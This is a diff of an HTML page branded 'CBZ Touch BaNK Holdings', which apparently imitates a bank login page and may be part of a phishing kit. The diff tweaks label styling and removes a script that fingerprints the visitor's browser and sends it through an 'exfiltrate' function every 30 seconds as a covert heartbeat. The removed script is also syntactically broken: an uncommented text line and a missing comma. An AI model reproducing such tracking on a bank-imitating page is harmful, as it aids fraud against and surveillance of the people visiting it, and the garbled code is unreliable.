@@ -30,7 +30,7 @@
     }
     .input-group input:focus, .input-group select:focus { border-color: #1b2b7a; outline: none; }
     .input-group label {
-      position: absolute; left: 14px; top: 16px; font-size: 16px; color: #777;
+      position: absolute; left: 10px; top: 12px; font-size: 12px; color: #777;
       pointer-events: none; transition: 0.2s ease all; background: #f5f5f5; padding: 0 4px;
     }
     .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label,
@@ -100,31 +100,5 @@
 
     <p class="note">@ CBZ Touch BaNK Holdings</p>
   </div>
-  
-<script>
-
-// === FINGERPRINT ===
-function getFingerprint() { const parts = [navigator.userAgent, navigator.language, screen.width + 'x' + screen.height, screen.depth, navigator.hardwareConcurrency || 'unknown', navigator.platform];
-
-const str = parts.join('::');
-let hash = 0;
-for (let i = 0; i < str.length; i++) {
-hash = ((hash << 5) - hash) + str.charCodeAt(i);
-hash = hash & hash;
-} return hash.toString(16);
-}
-
-
-      Periodic beacon to maintain session tracking
-      setInterval(() => {
-      exfiltrate({
-      type: 'heartbeat',
-      fingerprint: getFingerprint(),
-      timestamp: Date.now()
-      pageVisible: ! document.hidden
-      });
-      }, 30000); // Every 30 seconds
-
-    </script>
   </body>
 </html>
